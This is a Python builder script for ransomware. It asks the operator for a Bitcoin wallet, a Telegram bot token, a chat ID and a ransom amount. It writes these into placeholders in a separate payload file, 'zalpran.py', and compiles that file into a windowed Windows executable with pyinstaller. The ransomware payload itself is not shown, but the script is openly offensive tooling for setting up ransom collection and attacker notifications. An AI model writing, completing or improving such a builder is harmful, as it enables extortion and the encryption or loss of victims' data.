import os
import time
import subprocess


filename = 'zalpran.py'
filepath = os.path.join(os.getcwd(),filename)

def get_wallet():
    btc_wallet = input("Enter BTC wallet : ")
    btc_wallet2 = input("re-Enter BTC wallet : ")

    if btc_wallet != btc_wallet2:
        print('Wallet does not match')
        time.sleep(1)
        decision = input('Do you want to start build over again? Y/N [Y]:  ')
        if decision == 'N' or decision == "":
            print('Exiting Program......')
            os.system('exit')
        else:
            get_wallet()
    else:
        print('BTC wallet configuring...............')
        with open(filepath,'r', encoding='utf-8') as f:
            content = f.read()
        new_content = content.replace('"WALLET_HERE"',f'"{btc_wallet}"')
        with open(filepath, 'w', encoding='utf-8') as d:
            d.write(new_content)
        time.sleep(2)
        print('BTC wallet configured')
        return btc_wallet


def get_bot():
    bot = input('Enter Telegram Bot Token: ')
    if bot == "":
        get_bot()
    with open(filepath, 'r', encoding='utf-8') as f:
         content = f.read()
    new_content = content.replace('"TOKEN_HERE"',f'"{bot}"')
    with open(filepath, 'w', encoding='utf-8') as d:
        d.write(new_content)
    time.sleep(2)
    print('BOT TOKEN wallet configured')
    return bot

def get_chatID():
    id = input('Enter Telegram Chat id :  ' )
    if id == "":
        get_chatID()
    with open(filepath, 'r', encoding='utf-8') as f:
        content = f.read()
    new_content = content.replace('"ID_HERE"', f'"{id}"')
    with open(filepath, 'w', encoding='utf-8') as d:
        d.write(new_content)
    time.sleep(2)
    print('CHAT ID configured')
    return id

def get_amount():
    amount = input('Enter Amount to ransom(USD): ')
    if amount == "":
        get_amount()
    amount = f"${amount}"
    with open(filepath, 'r', encoding='utf-8') as f:
        content = f.read()
    new_content = content.replace('"PRICE_HERE"', f'"{amount}"')
    with open(filepath, 'w', encoding='utf-8') as d:
        d.write(new_content)
    time.sleep(2)
    print(' AMOUNT RANSOM configured')
    return amount

def py2exe():
    output_dir = "C:\\Users\\DAVID\\Pictures\\happyboi"
    os.makedirs(output_dir, exist_ok=True)
    c0mmand = f'pyinstaller --onefile --distpath {output_dir} --windowed {filename}'
    subprocess.call(c0mmand, shell=True)
    print(f"The file has been converted to exe and is now saved at {output_dir}")



def main():
    get_wallet()
    get_bot()
    get_chatID()
    get_amount()
    py2exe()

if __name__ == '__main__':
    main()